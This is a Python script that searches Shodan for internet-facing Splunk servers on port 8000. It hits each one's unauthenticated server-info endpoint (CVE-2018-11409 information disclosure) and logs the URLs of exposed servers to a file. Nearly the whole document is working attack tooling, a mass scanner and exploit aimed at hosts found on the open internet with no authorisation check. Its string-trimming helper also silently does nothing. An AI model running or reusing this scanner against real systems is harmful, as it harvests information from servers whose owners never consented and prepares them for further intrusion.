#!/usr/bin/env python
#
# splunk-info.py
# Search SHODAN for CVE-2018-11409 info disclosure
#
# Author: random_robbie

import shodan
import sys
import re
import requests
from time import sleep
from requests.auth import HTTPBasicAuth
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Configuration
API_KEY = "YOURAPIKEY"
SEARCH_FOR = 'splunkd port:"8000"'
FILE = "/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json"
session = requests.Session()

def filter_result(str):
	str.strip() #trim
	str.lstrip() #ltrim
	str.rstrip() #rtrim
	return str

def grab_file (IP,PORT,FILE):
	print ("[*] Testing: "+IP+" on Port: "+PORT+"[*]\n")
	try:
		URL = "http://"+IP+":"+PORT+""+FILE+""
		headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0"}
		response = session.get(URL, headers=headers, timeout=10, verify=False)
		result = response.text
		if 'Unauthorized' not in result:
			if "activeLicenseGroup" in result:
				text_file = open("./cfg/splunk.cfg", "a")
				text_file.write(""+URL+"\n")
				text_file.close()
				print ("[*] Splunk... Found [*]\n")
		else:
			print ("[*] Not Vulnerable [*]\n ")
	except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
			
	except Exception as e:
		print (e)
		print ("[*] Nothing Found on IP: "+IP+" [*]\n")
	



	
	
try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR, limit="1000")

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = service['ip_str']
				PORT = str(service['port'])
				CC = service['location']['country_name']
				grab_file (IP,PORT,FILE)
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)
